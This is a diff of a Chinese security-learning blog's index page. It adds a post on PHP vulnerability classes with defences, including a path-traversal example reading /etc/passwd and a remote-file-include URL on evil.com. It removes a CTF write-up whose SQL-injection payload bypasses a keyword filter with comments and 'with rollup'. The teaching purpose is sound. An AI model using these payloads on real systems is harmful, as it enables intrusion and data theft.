@@ -69,6 +69,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-php特性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/16/php%E7%89%B9%E6%80%A7/" class="article-date">
+  <time class="dt-published" datetime="2025-02-16T13:23:42.000Z" itemprop="datePublished">2025-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/16/php%E7%89%B9%E6%80%A7/">php特性</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>PHP文件包含漏洞（File Inclusion Vulnerabilities）<br>本地文件包含（LFI，Local File Inclusion）：</li>
+</ol>
+<p>攻击者可以通过传入特殊的路径参数，包含服务器上的本地文件，如&#x2F;etc&#x2F;passwd等敏感文件。<br>利用LFI攻击，攻击者可以进一步执行代码（例如，通过包含PHP文件）。<br>示例：index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>防御措施：对包含的文件路径进行严格的过滤，禁止使用相对路径，尽量避免使用include、require函数直接拼接用户输入。<br>远程文件包含（RFI，Remote File Inclusion）：</p>
+<p>攻击者通过传入外部URL，包含远程的PHP文件，可能导致远程代码执行（RCE）。<br>示例：index.php?page&#x3D;<a target="_blank" rel="noopener" href="http://evil.com/malicious.php">http://evil.com/malicious.php</a><br>防御措施：禁用allow_url_include和allow_url_fopen，严格验证输入，避免包含不受信任的外部文件。</p>
+<ol start="2">
+<li><p>PHP反序列化漏洞（PHP Object Injection）<br>反序列化漏洞：当PHP处理用户输入的数据（如通过unserialize()函数反序列化数据）时，攻击者可以构造恶意的序列化数据，导致程序执行不期望的操作，如RCE。<br>示例：<br>php<br>$obj &#x3D; unserialize($_GET[‘data’]);<br>攻击者可以通过精心构造的序列化数据，操控代码流、触发任意代码执行。<br>防御措施：避免使用unserialize()来反序列化不可信数据，或者使用json_decode()代替；对于反序列化数据进行严格验证，使用allowed_classes选项限制可以反序列化的类。</p>
+</li>
+<li><p>PHP配置问题<br>phpinfo()泄露敏感信息：</p>
+</li>
+</ol>
+<p>phpinfo()函数会显示PHP环境的所有配置信息，包括敏感路径、PHP扩展信息、服务器信息等。攻击者可以利用这些信息进行进一步攻击。<br>防御措施：确保phpinfo()函数不会暴露给用户，禁止在生产环境中使用。<br>expose_php设置：</p>
+<p>当expose_php配置为On时，PHP会在HTTP响应头中暴露PHP的版本信息，攻击者可以利用这个信息来寻找该版本的已知漏洞。<br>防御措施：确保在php.ini中将expose_php设置为Off，避免泄露版本信息。<br>allow_url_fopen与allow_url_include：</p>
+<p>这两个配置项控制是否允许PHP访问远程URL或通过include引入远程文件。它们被滥用时会导致RFI攻击。<br>防御措施：将这两个选项设置为Off，禁用远程文件访问功能。</p>
+<ol start="4">
+<li>PHP会话管理漏洞<br>会话固定攻击（Session Fixation）：<br>攻击者通过操控用户会话ID（例如，通过URL参数或Cookie）来劫持会话，甚至在用户登录</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/16/php%E7%89%B9%E6%80%A7/" data-id="cm77nt3tf00000sva24kf33yt" data-title="php特性" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-目录遍历" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/16/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" class="article-date">
@@ -527,50 +582,6 @@
 
 
   
-    <article id="post-web10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/26/web10/" class="article-date">
-  <time class="dt-published" datetime="2025-01-26T14:07:27.000Z" itemprop="datePublished">2025-01-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/26/web10/">web10</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>进入靶机<br>界面是管理员登录的页面<br>需要输入用户名和密码，但不一样的是除了登录键，还有取消键<br>我们试着点一下取消键，获得一个index.php文件<br>用记事本打开<br>&lt;?php<br>		$flag&#x3D;””;<br>        function replaceSpecialChar($strParam){<br>             $regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”;<br>             return preg_replace($regex,””,$strParam);<br>        }<br>        if (!$con)<br>        {<br>            die(‘Could not connect: ‘ . mysqli_error());<br>        }<br>		if(strlen($username)!&#x3D;strlen(replaceSpecialChar($username))){<br>			die(“sql inject error”);<br>		}<br>		if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){<br>			die(“sql inject error”);<br>		}<br>		$sql&#x3D;”select * from user where username &#x3D; ‘$username’”;<br>		$result&#x3D;mysqli_query($con,$sql);<br>			if(mysqli_num_rows($result)&gt;0){<br>					while($row&#x3D;mysqli_fetch_assoc($result)){<br>						if($password&#x3D;&#x3D;$row[‘password’]){<br>							echo “登陆成功<br>“;<br>							echo $flag;<br>						}</p>
-<pre><code>				 &#125;
-		&#125;
-?&gt;
-</code></pre>
-<p>从文件的$regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”可以得知sql注入里大多数关键词都被过滤了<br>因此不能使用常规注入的方法<br>根据提示，可以使用with roolup使密码为空，然后进行绕过<br>于是用&#x2F;<strong>&#x2F;代替空格构造<br>‘or&#x2F;</strong>&#x2F;1&#x3D;1&#x2F;<strong>&#x2F;group&#x2F;</strong>&#x2F;by&#x2F;<strong>&#x2F;password&#x2F;</strong>&#x2F;with&#x2F;**&#x2F;rollup#<br>不用输密码<br>点击登录，得到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/26/web10/" data-id="cm6dphzph0000rkvafb2a92k6" data-title="web10" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -607,6 +618,10 @@
       <ul>
         
           <li>
+            <a href="/2025/02/16/php%E7%89%B9%E6%80%A7/">php特性</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/16/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/">目录遍历</a>
           </li>
         
@@ -620,10 +635,6 @@
         
           <li>
             <a href="/2025/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/09/web90/">web90</a>
           </li>
         
       </ul>
